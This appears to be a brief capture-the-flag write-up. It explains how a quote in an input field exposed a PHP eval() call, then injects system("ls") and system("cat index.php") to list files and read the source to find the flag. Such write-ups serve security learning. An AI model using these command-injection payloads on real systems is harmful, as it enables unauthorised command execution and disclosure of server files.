* Type ' in the input. You will the error:
```
Parse error: syntax error, unexpected '';' (T_ENCAPSED_AND_WHITESPACE) in /var/www/html/index.php(5) : eval()'d code on line 1
```
* So, looks like they are using eval() in PHP to evaluate the expressions. We can input php code and evaluate that.
* Type `system("ls");`

* Type `system("cat index.php")` and check the page source, you will get the flag.
